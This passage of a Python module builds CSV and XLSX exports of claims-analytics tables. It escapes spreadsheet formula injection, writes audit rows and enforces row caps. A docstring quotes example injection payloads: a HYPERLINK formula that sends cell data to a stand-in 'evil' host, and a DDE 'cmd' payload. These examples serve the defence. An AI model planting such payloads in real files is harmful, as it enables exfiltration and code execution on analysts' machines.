    """The five verdict buckets, in `ReserveVerdict`'s declaration order. Pure.

    **All five, zero-filled**, because the distribution is — `ReserveAdequacy`'s
    rule, which is `_banded`'s: a verdict is a *rule's* answer over a claim every
    book contains, so "no claim in this segment is under-reserved" is an answer
    rather than an absent category, and a three-row file cannot be told from a
    five-row file with two rows lost.

    `reserve_verdict` rather than `verdict` as the column name, and it is not
    cosmetic: it is the `filter[reserveVerdict]` facet's own name in DB spelling,
    so the file says which facet opens the claims behind each row.
    """
    return ExportTable(
        target=ExportTarget.reserve_adequacy,
        columns=_ADEQUACY_COLUMNS,
        rows=tuple((item.verdict.value, item.count) for item in adequacy.items),
    )


#: One fold, from whatever aggregate answers a target to the table it becomes.
#:
#: `Callable[[Any], ExportTable]` rather than `object`, and the argument type is
#: `Any` rather than a union for a reason worth stating: the eight folds take
#: eight unrelated aggregates (`FraudPanel`, `PortfolioTrends`, a ranked
#: sequence…), so the only honest common supertype is "whatever its own target
#: produced". What the alias *does* buy is the half that was missing while the
#: values were typed `object` — mypy now checks that every entry below is
#: callable and returns an `ExportTable`, so a fold that started returning a
#: tuple, or a value that was never a function at all, fails the type check
#: rather than a request.
type _Fold = Callable[[Any], ExportTable]

#: Which fold answers each target — checked total at import, and **dispatched
#: through**.
#:
#: The guard `segmentation.VocabularyDivergence` was written for, on this
#: module's own vocabulary: a ninth `ExportTarget` member added for a new route
#: and forgotten here would be a target the router could name and nothing could
#: shape.
#:
#: **Every entry point shapes its table through `_shape` below**, which is what
#: makes that guard load-bearing rather than decorative. It was not, briefly:
#: the two multi-target entry points asked `if target is X else Y`, so a ninth
#: member registered here perfectly correctly would still have fallen into the
#: `else` and exported the *wrong table* — a file of SIU stages under a heading
#: and an audit row saying it was something else. A registry that is checked and
#: not consulted proves only that somebody typed the member's name twice.
#:
#: The values are the functions themselves rather than their names, so a fold
#: that is deleted or renamed is a `NameError` at import rather than a string
#: that stops matching anything.
_DISPATCHED: Final[Mapping[ExportTarget, _Fold]] = {
    ExportTarget.claims: claims_table_of,
    ExportTarget.fraud_bands: fraud_bands_table_of,
    ExportTarget.siu_pipeline: siu_pipeline_table_of,
    ExportTarget.fraud_rates: fraud_rates_table_of,
    ExportTarget.trend_series: trend_series_table_of,
    ExportTarget.financial_breakdown: financial_breakdown_table_of,
    ExportTarget.cost_drivers: cost_drivers_table_of,
    ExportTarget.reserve_adequacy: reserve_adequacy_table_of,
}
_require_total(_DISPATCHED, ExportTarget, "ExportTarget and the folds that shape it")


def _shape(target: ExportTarget, aggregate: object) -> ExportTable:
    """The one place a target becomes a table. Pure, and one line on purpose.

    Every entry point goes through here, including the four that have only one
    target to choose from, so that the registry above is the *only* answer to
    "which fold shapes this" anywhere in the module. A single-target entry point
    calling its fold directly would be harmless in itself and would make the
    rule a matter of taste at the two sites where it is not — which is how the
    `if target is X else Y` this replaced came to exist.

    A mis-wired route handing a target the wrong aggregate now fails **loudly**
    — `claims_table_of(a FraudPanel)` raises rather than returning a plausible
    table — which is the whole gain: the previous binary branch answered every
    unrecognised target with the same silent fallback.
    """
    return _DISPATCHED[target](aggregate)


# --- the two renderers ----------------------------------------------------


def _cell(value: ExportValue) -> str:
    """One cell as text — the single place a value becomes a string.

    Five branches, and each is a convention stated once rather than at eight
    folds:

    - `None` is the **empty field**, never `"null"`, `"None"` or `0`. A blank is
      what every CSV reader turns back into a null; the three alternatives are a
      literal string, a Python repr and a lie.
    - `bool` before `int`, because `True` *is* an `int` in Python and would
      otherwise render as `1` — the same near-miss `rules/parameters._number`
      guards against at the other end of the tier.
    - `date` is ISO-8601, which is the wire's format, sorts lexically and is the
      one date spelling no locale reinterprets.
    - everything else is `str(...)`, which reaches integers and the one float
      (`priority_score`, a rank rather than a quantity).

    `bool` renders `true`/`false` rather than `TRUE`/`FALSE` because those are
    the strings the API carries and the strings `drill_through.chip_value`
    publishes, so a boolean in a file and a boolean in a URL are one word.
    """
    if value is None:
        return ""
    if isinstance(value, bool):
        return "true" if value else "false"
    if isinstance(value, date):
        return value.isoformat()
    return str(value)


#: The characters a spreadsheet engine reads as "this cell is a program".
#:
#: `=` and `@` open a formula in Excel, LibreOffice Calc and Google Sheets; `+`
#: and `-` open one in Excel and Calc, which accept them as the leading sign of
#: an expression as well as of a number. A leading tab or carriage return is
#: here because all three strip leading whitespace *before* deciding, so
#: `\t=HYPERLINK(…)` is a formula wearing a disguise the CSV quoting rules do
#: not remove.
_FORMULA_LEADS: Final[frozenset[str]] = frozenset("=+-@\t\r")

#: A cell that is unambiguously a number, whatever its sign.
#:
#: The exemption `_FORMULA_LEADS` needs, and the reason it is a strict pattern
#: rather than `float(...)`: `float` accepts `-inf` and `nan`, which a
#: spreadsheet reads as names and therefore as formulas, so parsing with it
#: would exempt exactly the strings that need escaping least obviously.
_PLAIN_NUMBER: Final[re.Pattern[str]] = re.compile(r"[+-]?\d+(?:\.\d+)?(?:[eE][+-]?\d+)?\Z")


def _csv_cell(value: ExportValue) -> str:
    """`_cell`, plus the one escape a spreadsheet engine makes necessary.

    **`csv.writer` quotes for the parser and never for the reader.** RFC 4180
    quoting exists so a delimiter, a quote or a newline inside a field survives
    the round trip; it says nothing about what the program on the other end does
    with the field afterwards. Excel, LibreOffice Calc and Sheets all strip the
    quotes and *then* decide whether the text is a formula — so
    `=HYPERLINK("http://evil/?d="&A1,"claim")` in a `worker_name` column arrives
    quoted, intact, and executes the moment the analyst opens the file. Five of
    this module's columns are free text a claim record supplied (`worker_name`,
    `injury_type`, `handler_name`, `employer_short_name`, and the breakdown
    `label`), and none of them has a vocabulary anything validates.

    That is AD-16's "injected text is data, never instructions" arriving at a
    surface the architecture decision was not written about. The copilot's
    version of this rule is about a model reading a claim field; this one is
    about a spreadsheet engine reading the same field, and the failure is worse
    in kind — the model is sandboxed and the analyst's Excel is not, so the
    payload runs on a workstation inside the network with that analyst's own
    credentials, hours after the request that produced it has been forgotten.

    **A leading apostrophe**, which is the mitigation every spreadsheet already
    agrees on: it is the "treat this cell as text" marker all three formats
    honour, it is not shown to the reader in the cell, and it survives a round
    trip through the same programs. The alternatives are worse in ways that
    matter here — wrapping the value in a quoted formula-safe expression rewrites
    the data, prefixing a space changes a value a consumer may join on, and
    stripping the character deletes information from a file whose whole claim is
    that it is the payload in a rectangular shape.

    **A number keeps its sign.** `-`, `+` and their numeric friends are the one
    place a blanket escape would do real damage: `priority_score` is genuinely
    negative for a settled claim (`priority_weights.settledPenalty`), and
    `'-142.5` is a *text* cell — so a spreadsheet could no longer sort the file
    back into the order it was downloaded in, which `_CLAIM_COLUMNS` names as
    the reason that column is exported at all. So a dangerous lead is escaped
    unless the whole cell is a plain number, which `=`, `@`, a tab and a return
    never are, and which `+1+1` and `-1+cmd|'/c calc'!A1` are not either.

    **CSV only, and the asymmetry with XLSX is deliberate** even though this
    section's standing doctrine is that the two formats hold the same values.
    They still do, as *values*: `render_xlsx` calls `write_string`, which forces
    a string cell — a formula in XLSX is a different element written by a
    different method (`write_formula`), so the text can no more become a program
    there than it could in a `.txt` file. The apostrophe is a **CSV encoding
    artefact**, the file format's own way of saying what XLSX says structurally,
    and adding it to the worksheet would put a literal apostrophe in a cell that
    was never in danger. `tests/test_dataset_export.py` compares the two renderers
    cell for cell and therefore has to know about this one divergence, which is
    the honest place for it to be recorded.
    """
    rendered = _cell(value)
    if rendered[:1] in _FORMULA_LEADS and not _PLAIN_NUMBER.match(rendered):
        return f"'{rendered}"
    return rendered


def render_csv(table: ExportTable) -> Iterator[bytes]:
    """The table as UTF-8 CSV, in chunks. RFC 4180 quoting, header row first.

    **A generator, and the buffer is drained rather than grown**, which is the
    whole of "streams without holding the file twice": `csv.writer` needs a
    text sink, so one `StringIO` is written into, encoded and truncated as the
    rows go by, and at no point does more than `_CSV_CHUNK_CHARS` of rendered
    text exist. The *table* is already materialised — that is what makes the row
    count real and the audit row honest — so this bounds the rendering rather
    than the fold, and `deferred-work.md` records the O(scope) read behind both.

    **The header row is yielded on its own**, before any data row, so an export
    that produced no rows is still a file with a header in it. A zero-byte
    download is indistinguishable from a failed one, and an empty segment is a
    200 rather than a failure.

    `lineterminator="\\r\\n"` is `csv`'s own default and is RFC 4180's; stated
    rather than left implicit because the one thing a consumer notices about a
    generated CSV is its line endings, and "whatever the module defaults to" is
    not a contract.

    No BOM. Excel reads UTF-8 without one on every currently supported version,
    and a BOM makes the first column's header unmatchable for every non-Excel
    reader — which is the trade this file's "data product, not a screen" ruling
    settles in the parser's favour.

    Every field — the header row included — goes through `_csv_cell` rather than
    `_cell`, which is where the formula escape lives. The header carries only
    `snake_case` column names today and needs no escaping; it is routed through
    the same function anyway, because "which of the two renderings does this call
    site want" is a question a ninth column should not be able to answer wrong.
    """
    buffer = io.StringIO()
    writer = csv.writer(buffer, lineterminator="\r\n")

    def drain() -> bytes:
        rendered = buffer.getvalue().encode("utf-8")
        buffer.seek(0)
        buffer.truncate(0)
        return rendered

    writer.writerow([_csv_cell(column.name) for column in table.columns])
    yield drain()
    for row in table.rows:
        writer.writerow([_csv_cell(value) for value in row])
        if buffer.tell() >= _CSV_CHUNK_CHARS:
            yield drain()
    remaining = drain()
    if remaining:
        yield remaining


def render_xlsx(table: ExportTable) -> bytes:
    """The table as one worksheet in an XLSX workbook. Nothing touches a disk.

    `{"in_memory": True}` is not a performance option here, it is the AD-11
    posture: without it `xlsxwriter` writes its worksheet parts through
    `tempfile`, which would put a PHI-bearing fragment on the container
    filesystem for the length of a request. `pyproject.toml` records this as the
    reason the dependency is this library rather than openpyxl, whose comparable
    write-only mode spools by design.

    **One `bytes` rather than an iterator, unlike `render_csv`**, and the
    asymmetry is the format's rather than a shortcut: an XLSX is a zip container
    whose central directory is written last, so there is no prefix of it that is
    a valid file. A chunked build would be a generator that yielded nothing until
    it yielded everything, which is a stream in shape and not in substance.
    `StreamingResponse` still takes it — as a one-element body — so the two
    formats leave through one code path.

    **Integers are written as numbers and everything else as text**, and
    "everything else" is meant literally — including the one float. That is what
    makes a worksheet comparable against the CSV *cell for cell*: XLSX stores a
    number's value rather than its lexical form, so `7.0` comes back as `7` and
    the two files would differ on the one column that carries a fraction
    (`priority_score`, which is a rank rather than a quantity and is not a column
    anybody sums). One rule, one comparison, no normalisation in the test that
    could hide a real divergence.

    Deliberately *not* Excel serial dates: a date written as `46_000` is a value
    a reader has to know a spreadsheet epoch to interpret, and the ISO string is
    the same characters the CSV carries. Deliberately not booleans-as-booleans
    either, for the same reason — `TRUE` is Excel's word, `true` is the API's,
    and one file per format saying different words about one value is the
    divergence this module exists to prevent.

    `bool` is excluded from the numeric branch explicitly, for `_cell`'s reason:
    `True` *is* an `int` in Python, and writing it as a number would put `1` in a
    cell whose CSV twin says `true`.

    **Every write's return code is read**, which is the one thing this function
    did not do and the one thing that made it capable of lying. `xlsxwriter`
    reports a per-cell failure as a negative `int` and then carries on: `-1` for
    a coordinate past the end of the sheet, `-2` for a string over 32,767
    characters, which it *silently truncates*. Ignoring those meant that a
    workbook could close successfully, open successfully, and be short — beside
    an audit row and a CSV of the same query that both report the full count.
    `ExportUnwritable` is the refusal; there is deliberately no repair, because
    every repair here (drop the row, truncate the string, spill to a second
    sheet) is this module deciding what an export says, which is the one thing
    its docstring forbids.

    No cell is escaped for formula injection here and that is not an oversight —
    see `_csv_cell`, which argues it: `write_string` writes a string cell, and a
    formula in XLSX is a different element written by a different method, so the
    text cannot become a program. The apostrophe the CSV carries is that
    format's way of saying what this one says structurally.
    """
    buffer = io.BytesIO()
    workbook = xlsxwriter.Workbook(buffer, {"in_memory": True})
    worksheet = workbook.add_worksheet(_WORKSHEET_NAME)

    def written(code: int, row_index: int, column_index: int) -> None:
        """Refuse a negative return code, naming the cell that produced it."""
        if code < 0:
            raise ExportUnwritable(
                f"the spreadsheet writer refused row {row_index} column "
                f"{column_index} of the {table.target.value} export with code "
                f"{code}; a workbook short of the rows its audit row names is "
                "worse than no workbook"
            )

    for index, column in enumerate(table.columns):
        written(worksheet.write_string(0, index, column.name), 0, index)
    for row_index, row in enumerate(table.rows, start=1):
        for index, value in enumerate(row):
            if value is None:
                # Left blank rather than written as an empty string: a truly
                # absent cell has no `<c>` element at all, which is what a
                # spreadsheet's own "is this blank" test reads, and it is the
                # closest XLSX equivalent of the CSV's empty field.
                continue
            if isinstance(value, int) and not isinstance(value, bool):
                written(worksheet.write_number(row_index, index, value), row_index, index)
            else:
                written(worksheet.write_string(row_index, index, _cell(value)), row_index, index)
    workbook.close()
    return buffer.getvalue()


def filename_for(target: ExportTarget, fmt: ExportFormat, on: date) -> str:
    """The name the browser saves the download under.

    Three parts and no fourth: the product, what was exported, and the day it was
    taken. **Not the filter set**, which is the one thing a reader would expect to
    find in it and the one thing that must not be — a filename carrying
    `employer-3-icd10-W17.89XA` is claim-adjacent metadata written into a string
    that gets mailed around, pasted into tickets and logged by every intermediary
    on the way down. AD-11's "no PHI in a filename" is the rule; the audit row is
    where the filter set belongs, and it is content-free precisely so that this
    can be.

    The date is the day the export was taken rather than the window it covers,
    because two of the eight targets have no window at all and a name whose
    meaning changed per target would be a name nobody could sort a folder by.

    Underscores become hyphens so the name reads as a filename rather than as a
    Python identifier; `ExportTarget`'s stored values stay snake_case because
    they are an enum on the wire and this is a display decision about a string.
    """
    return f"lineworker-{target.value.replace('_', '-')}-{on.isoformat()}.{fmt.value}"


# --- the six entry points -------------------------------------------------
#
# One per sibling route. Each gates, calls the *same* aggregate function its
# sibling calls, shapes the result, checks the cap and writes the audit row — in
# that order, which `_finish` owns so that six routes cannot get it wrong six
# different ways.


def _facet_terms(filters: object, wire_keys: Mapping[str, str]) -> dict[str, str]:
    """The set facets of a filter block, keyed and valued as the wire carried them.

    Read off the dataclass's own fields against `WIRE_KEYS`, never written out,
    for `FILTER_KEYS`' reason: a twenty-sixth facet added to `DrillFilters` and
    forgotten here would narrow an export and appear in no audit row — a
    narrowing nobody can see, on the one row whose whole job is to say what was
    asked for.

    `drill_through.chip_value` renders the values, and it is the same function
    the applied-filter chips use. That is what keeps the audit row paste-able
    back into a URL: `true` rather than `True`, `2026-03-01` rather than
    `datetime.date(2026, 3, 1)`, and one spelling rather than two.

    **The key is `filter[severityBand]` and not `severityBand`**, which is the
    half that was wrong: `WIRE_KEYS` maps a field to its *facet* name because its
    other consumer is `AppliedFilter.key`, which names a chip rather than a
    query parameter. `record_export`'s docstring promises a mapping "keyed by the
    name the wire uses" that a reader "should be able to paste into a URL", and
    the bare form is not that — the six routes declare `filter[severityBand]`, so
    a row recording `severityBand` documents a parameter no route accepts. It
    also read as a *different kind* of key from the controls sitting beside it in
    the same mapping, which keep their full spelling (`sort[injuryType]`,
    `groupBy`), so one mapping carried two conventions with nothing saying which
    was which. Composed here rather than in `WIRE_KEYS` because the bracket
    belongs to the *route's* parameter surface and not to the facet's name: a
    chip is not a query parameter and must not acquire the brackets.

    Unset facets are **omitted rather than recorded as null**, because "they did
    not filter by gender" and "they filtered by gender: nothing" are different
    statements and only the first is true. It also keeps `entity_id`'s digest
    stable across a story that appends a facet: a request that sets three facets
    hashes the same before and after a twenty-sixth is declared.
    """
    terms: dict[str, str] = {}
    for field in fields(filters):  # type: ignore[arg-type]
        value = getattr(filters, field.name)
        if value is None:
            continue
        terms[f"filter[{wire_keys[field.name]}]"] = drill_through.chip_value(value)
    return terms


async def _finish(
    db: AsyncSession,
    ctx: CallerContext,
    table: ExportTable,
    fmt: ExportFormat,
    limits: ExportLimits,
    filters: Mapping[str, str],
) -> ExportTable:
    """Check the cap, write the audit row, hand the table back. **In that order.**

    The one place the ordering AC 2 and AC 4 describe is written down, and it is
    a function rather than six copies of three statements because the order is
    the whole of both criteria and each of the six routes could get it wrong
    differently.

    **The cap first**, so a refused export writes no audit row and sends no
    bytes. An egress log recording an export that never happened is worse than
    useless: it would make the one question the log exists to answer — what left
    this system — answerable only with a second source.

    **The audit row second, and it commits**, so it is durable before the
    response begins. That is not a preference: FastAPI closes the request-scoped
    session before a `StreamingResponse`'s body iterator runs, so a row written
    "as the file streams" would have no transaction to live in. The consequence
    is that an export failing part-way through transmission is *over*-recorded
    rather than unrecorded, which is the direction this log should err in.

    **The row count is the table's**, taken after it exists rather than estimated
    from the caseload, which is what AC 2's "real, not estimated" asks for and
    what makes the count checkable against the file a test just downloaded.

    **Two caps, and the policy one is checked first.** `export_limits.maxRows` is
    a rules-tier document explicitly designed to be retuned without a deploy, and
    the format's own sheet limit (`_XLSX_MAX_ROWS`) is a structural fact nobody
    tunes — so an owner who raises the first past the second would otherwise get
    a spreadsheet that stops at row 1,048,576 while the audit row and the CSV of
    the same query both report the whole table. The order matters because the
    two refusals are not equally useful: the policy cap tells a caller what to
    narrow past, and the format cap tells them to take the CSV instead, so the
    one a caller can act on generally is checked first and the one that depends
    on which button they pressed comes second. The header row occupies one of the
    sheet's rows, which is why the comparison is against `_XLSX_MAX_ROWS - 1`.
    """
    if len(table.rows) > limits.max_rows:
        raise ExportTooLarge(
            f"That export would contain {len(table.rows)} rows and this deployment "
            f"caps an export at {limits.max_rows}; narrow the filters and try again."
        )
    if fmt is ExportFormat.xlsx and len(table.rows) > _XLSX_MAX_ROWS - 1:
        raise ExportTooLarge(
            f"That export would contain {len(table.rows)} rows and a worksheet holds "
            f"{_XLSX_MAX_ROWS - 1} beside its header; take it as CSV, or narrow the "
            "filters and try again."
        )
    await audit.record_export(
        db,
        ctx,
        target=table.target.value,
        fmt=fmt.value,
        rows=len(table.rows),
        filters=filters,
    )
    return table


async def export_claims(
    db: AsyncSession,
    ctx: CallerContext,
    thresholds: DerivationThresholds,
    weights: PriorityWeights,
    limits: ExportLimits,
    filters: DrillFilters,
    fmt: ExportFormat,
    *,
    as_of: date | None = None,
) -> ExportTable:
    """The whole filtered claim list, ranked, as a table — the route's one call.

    **`drill_through.select` rather than `drill_through_claims`**, and that is the
    difference AC 2 turns on: the paged entry point cuts a window out of the
    ranked list, so an export built on it would contain the page the browser
    happened to have. `select` returns the entire population and its count, which
    is exactly what "every page of them, not the pages that happen to be loaded"
    means.

    Everything between the read and the fold is `drill_through_claims`' own —
    `claims_of` builds the projection (one function, two callers, so an exported
    row cannot be built differently from a displayed one) and
    `without_reserve_verdict` narrows before the verdict map is loaded.

    **One scoped read, with the same single exception the paged route has.**
    `filter[reserveVerdict]` is the one facet whose predicate cannot run over a
    row, so setting it costs two more reads and the `reserve_bands` document —
    conditional, so that every other export stays at one read and the cost is
    visible where it is paid. `tests/test_dataset_export.py` counts the
    statements.

    Takes both parameter blocks and the limits rather than fetching any of them,
    `drill_through_claims`' signature and its reason: the route loads them once
    and hands them down.

    Raises `FraudAnalyticsNotPermitted` (403) for any role outside
    `fraud.FRAUD_ANALYTICS_ROLES`, **before the read** — and note that this is a
    *new* gate rather than an inherited one. `/dashboard/claims` is deliberately
    ungated: it lists claims the session can already open one at a time. Its
    export is not the same act, because an export is PHI leaving the system
    (NFR-5) and is the analyst workspace's capability; a handler who may read her
    own queue does not thereby carry a right to extract it.
    """
    require_fraud_analytics_access(ctx)
    today = as_of or utc_today()
    rows = await claim_repo.select_drill_rows(db, ctx)
    caseload = drill_through.claims_of(rows, thresholds, today)

    # The conditional the paged route pays for, on the same terms and for the
    # same reason — narrowing first is what keeps the two extra reads
    # proportional to the *filtered* list rather than to the caller's whole book.
    verdicts: Mapping[str, ReserveCheck] | None = None
    population = caseload
    if filters.reserve_verdict is not None:
        bands = await reserve_bands_for(db, today)
        population = drill_through.without_reserve_verdict(caseload, filters, thresholds)
        verdicts = await reserve_checks_for_claims(db, ctx, population, bands=bands)

    ranked, _total = drill_through.select(population, filters, thresholds, weights, verdicts)
    return await _finish(
        db,
        ctx,
        _shape(ExportTarget.claims, ranked),
        fmt,
        limits,
        _facet_terms(filters, drill_through.WIRE_KEYS),
    )


async def export_fraud(
    db: AsyncSession,
    ctx: CallerContext,
    thresholds: DerivationThresholds,
    limits: ExportLimits,
    filters: Segmentation,
    target: ExportTarget,
    fmt: ExportFormat,
) -> ExportTable:
    """The band distribution or the SIU pipeline — the Fraud section's two charts.

    One entry point for two targets rather than two, because they are **one
    fold**: `fraud.panel_of` accumulates all four counters in a single pass over
    one caseload, so serving the two from separate functions would be two scoped
    reads for one card's worth of data and two chances for the pipeline to
    describe a different population from the distribution beside it.

    `panel_of` is reached through `fraud.fraud_panel` — the function the route
    beside this one calls, not a re-fold of the same rows — so the exported
    counts are the counts on screen by construction.

    Raises `FraudAnalyticsNotPermitted` (403) before the read, `fraud_panel`'s
    own gate, called again here because capability belongs with the service that
    owns the rows.
    """
    require_fraud_analytics_access(ctx)
    panel = await fraud.fraud_panel(db, ctx, thresholds, filters)
    table = _shape(target, panel)
    return await _finish(db, ctx, table, fmt, limits, _facet_terms(filters, SEGMENTATION_WIRE_KEYS))


async def export_fraud_rates(
    db: AsyncSession,
    ctx: CallerContext,
    thresholds: DerivationThresholds,
    limits: ExportLimits,
    sorts: FraudRateSorts,
    filters: Segmentation,
    fmt: ExportFormat,
) -> ExportTable:
    """The three flagged-rate breakdowns, in the orders the tables are read in.

    `fraud.fraud_rates` is the sibling route's own call, so the cut and the three
    orders arrive decided. The sorts are threaded through rather than defaulted
    here because a table exported while the analyst is reading it in
    `label_asc` must come out in `label_asc` — an export that silently
    re-ordered would be the one place on this surface where the file and the
    screen disagree, and it would look like a fix.

    The three orders are recorded in the audit row beside the facets, for
    `record_export`'s reason: `sort[employer]=claims_desc` produces a different
    file from the same filter set, and a row that recorded only the facets would
    say the two exports were the same.
    """
    require_fraud_analytics_access(ctx)
    rates = await fraud.fraud_rates(db, ctx, thresholds, sorts, filters)
    terms = _facet_terms(filters, SEGMENTATION_WIRE_KEYS)
    terms.update(
        {
            "sort[injuryType]": sorts.injury_type.value,
            "sort[employer]": sorts.employer.value,
            "sort[handler]": sorts.handler.value,
        }
    )
    return await _finish(db, ctx, _shape(ExportTarget.fraud_rates, rates), fmt, limits, terms)


async def export_trends(
    db: AsyncSession,
    ctx: CallerContext,
    thresholds: DerivationThresholds,
    periods: TrendPeriods,
    settings: Settings,
    limits: ExportLimits,
    filters: Segmentation,
    fmt: ExportFormat,
    *,
    grain: TrendGrain = TrendGrain.month,
    anchor: TrendAnchor = TrendAnchor.fnol,
    cohort: TrendCohort = TrendCohort.none,
    from_date: date | None = None,
    to_date: date | None = None,
) -> ExportTable:
    """Every point of every series in the requested window.

    `trends.portfolio_trends` is the sibling route's own call, which means this
    export inherits both of its window refusals unchanged: an inverted range is
    `TrendRangeInvalid` and a window wider than `trend_periods.maxBuckets` is
    `TrendRangeTooWide`, both raised **before the read**, both translated by the
    same two functions the chart route uses. Two caps therefore apply to a trend
    export — how many buckets may be asked for, and how many rows may leave — and
    they bound different things: the first is the shape of the answer and the
    second is the size of the egress.

    The five window selectors stay keyword-only for `portfolio_trends`' reason:
    `from_date` and `to_date` are two adjacent optional dates, and a transposed
    pair would type-check and silently invert a window.

    They are recorded in the audit row, and the two dates only when set — a
    default window is a window the caller did not choose, and recording the
    resolved boundary would put a computed value in a row whose whole content is
    what was asked for.
    """
    require_fraud_analytics_access(ctx)
    computed = await trends.portfolio_trends(
        db,
        ctx,
        thresholds,
        periods,
        settings,
        filters,
        grain=grain,
        anchor=anchor,
        cohort=cohort,
        from_date=from_date,
        to_date=to_date,
    )
    terms = _facet_terms(filters, SEGMENTATION_WIRE_KEYS)
    terms.update({"grain": grain.value, "anchor": anchor.value, "cohort": cohort.value})
    if from_date is not None:
        terms["from"] = from_date.isoformat()
    if to_date is not None:
        terms["to"] = to_date.isoformat()
    return await _finish(db, ctx, _shape(ExportTarget.trend_series, computed), fmt, limits, terms)


async def export_financials(
    db: AsyncSession,
    ctx: CallerContext,
    thresholds: DerivationThresholds,
    limits: ExportLimits,
    filters: Segmentation,
    target: ExportTarget,
    fmt: ExportFormat,
    *,
    dimension: BreakdownDimension = decomposition.DEFAULT_BREAKDOWN,
) -> ExportTable:
    """The money breakdown or the two cost-driver pairs — one fold, two targets.

    `export_fraud`'s arrangement and its reason: `decomposition.decomposition_of`
    accumulates the portfolio totals, the breakdown groups and all four cohorts
    in **one pass** over one caseload, so two entry points would be two scoped
    reads for one section and two chances for a breakdown to sum to a different
    book from the cohorts beside it.

    `dimension` reaches the cost-driver export as well, where it changes nothing
    about the rows — and it is still recorded in the audit row, because it is
    what the caller asked for and the row says what was asked rather than what
    was used. The alternative, recording it only for the breakdown, would make
    two rows describing the same request look like different requests.
    """
    require_fraud_analytics_access(ctx)
    computed = await decomposition.financial_decomposition(
        db, ctx, thresholds, filters, dimension=dimension
    )
    table = _shape(target, computed)
    terms = _facet_terms(filters, SEGMENTATION_WIRE_KEYS)
    terms["groupBy"] = dimension.value
    return await _finish(db, ctx, table, fmt, limits, terms)


async def export_reserve_adequacy(
    db: AsyncSession,
    ctx: CallerContext,
    thresholds: DerivationThresholds,
    bands: ReserveBands,
    limits: ExportLimits,
    filters: Segmentation,
    fmt: ExportFormat,
) -> ExportTable:
    """The reserve-verdict distribution — Epic 3's answers, counted and exported.

    `decomposition.reserve_adequacy` is the sibling route's own call, so the
    verdicts arrive from `reserve.reserve_checks_for_claims` and this path
    re-derives nothing (AC 2, AD-2). It is the only export of the six that costs
    **three** scoped reads, for that function's recorded reason — the claims,
    then the payment-schedule weeks and the bills in bulk — and
    `tests/test_dataset_export.py` counts them so a fourth cannot appear quietly.

    It is also the only one that reads a second rule document, and `bands`
    arrives as an argument for `thresholds`' reason: the route loads both and
    hands them down.

    No control, so nothing beyond the ten dimensions reaches the audit row — a
    distribution over a closed five-member vocabulary has nothing to group by and
    nothing to sort.
    """
    require_fraud_analytics_access(ctx)
    adequacy = await decomposition.reserve_adequacy(db, ctx, thresholds, bands, filters)
    return await _finish(
        db,
        ctx,
        _shape(ExportTarget.reserve_adequacy, adequacy),
        fmt,
        limits,
        _facet_terms(filters, SEGMENTATION_WIRE_KEYS),
    )


__all__ = [
    "MEDIA_TYPE",
    "ExportColumn",
    "ExportFormat",
    "ExportTable",
    "ExportTarget",
    "ExportTooLarge",
    "ExportUnit",
    "ExportUnwritable",
    "ExportValue",
    "claims_table_of",
    "cost_drivers_table_of",
    "export_claims",
    "export_financials",
    "export_fraud",
    "export_fraud_rates",
    "export_reserve_adequacy",
    "export_trends",
    "filename_for",
    "financial_breakdown_table_of",
    "fraud_bands_table_of",
    "fraud_rates_table_of",
    "render_csv",
    "render_xlsx",
    "reserve_adequacy_table_of",
    "siu_pipeline_table_of",
    "trend_series_table_of",
]
